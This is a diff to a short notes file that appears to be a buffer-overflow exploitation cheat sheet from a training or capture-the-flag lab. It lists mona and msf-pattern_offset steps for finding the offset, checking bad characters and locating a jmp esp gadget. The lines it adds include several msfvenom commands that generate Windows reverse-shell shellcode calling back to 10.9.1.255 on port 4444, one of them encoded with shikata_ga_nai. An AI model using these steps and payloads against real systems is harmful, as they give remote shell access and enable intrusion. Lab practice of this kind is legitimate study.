@@ -12,7 +12,11 @@ python3 fuzzer.py
 
 exploit
 
-!mona findmsp -distance DISTANCE
+!mona findmsp -distance DISTANCE == Find Offset
+
+or
+
+/usr/bin/msf-pattern_offset -l DISTANCE -q EIP Register
 
 retn = BBBB
 
@@ -20,11 +24,15 @@ retn = BBBB
 
 !mona compare -f C:\Users\admin\Desktop\patota\bytearray.bin -a ESP
 
-!mona jmp -r esp -cpb "\x00\xa0\xad\xbe\xde\xef"
+!mona jmp -r esp -cpb "\x00\x01"
 
 retn = jmp
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xad\xbe\xde\xef" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c
 
 ## Script Fuzzer
 ```
